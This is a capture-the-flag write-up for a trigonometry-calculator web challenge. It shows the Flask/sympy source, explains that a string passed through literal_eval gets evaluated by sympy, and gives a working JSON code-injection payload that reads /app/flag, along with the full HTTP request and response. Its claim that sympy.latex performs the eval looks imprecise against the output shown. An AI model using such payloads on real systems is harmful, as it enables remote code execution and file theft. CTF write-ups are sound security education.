# Terrific Trigonometry Tutor
Task description:
```
Arr, me hearties! Ye be needin' to know how to use them fancy trigonometry functions, don't ye? Well, I be the one to teach ye! I be the best mathemagician in the seven seas, and with yer "generous donation", I've automated me lessons fer ye! Now, let's get started!
```

## Solution
In this challenge we're presented with a simple web application that allows us to calculate trigonometric equations as well as render them in latex.

![](./index.png)

We're also given the source of this application, which aside from serving static files, contains a single API route that returns latex and if possible calculates the equation:
```python
def postfix_calculator(inp):
    stack = []
    for (ty, val) in inp:
        if ty == 'num':
            stack.append(literal_eval(val))
        elif ty == 'var':
            stack.append(sympy.Symbol(val))
        elif ty == 'op':
            if val in regular_operators:
                a = stack.pop()
                b = stack.pop()
                stack.append(regular_operators[val](b, a))
            elif val in trig_operators:
                a = stack.pop()
                stack.append(trig_operators[val](a))
            else:
                raise ValueError("Invalid operator")
    return stack


@app.post("/compute")
def compute():
    try:
        expr = postfix_calculator(request.get_json())
        if len(expr) == 1:
            return sympy.latex(expr[0]) + r'\\=\\' + sympy.latex(sympy.simplify(expr[0]))
        else:
            return r'\quad{}'.join(map(sympy.latex, expr)) + r'\\=\\\cdots'
    except Exception as e:
        return "invalid expression"
```

After some digging into what `sympy.latex` does, it ends up essentially calling `eval` on the given string so if we can provide our own string into `expr[0]` we can run arbitrary python code.

To achieve that, we can use the `num` type of values which calls `literal_eval` on the value which can parse strings.

The request body can look something like this:
```json
[
    [
        "num",
        "\"open('/app/flag','r').read()\""
    ]
]
```
Which will return the contents of the flag file.

Final requests look something like this:
```
POST /compute HTTP/1.1
Host: 127.0.0.1:1337
Content-Length: 44
Content-Type: application/json
Connection: close

[["num","\"open('/app/flag','r').read()\""]]


HTTP/1.1 200 OK
Server: gunicorn
Date: Tue, 25 Apr 2023 16:36:56 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 57

\mathtt{\text{open('/app/flag','r').read()}}\\=\\FAKEFLAG
```
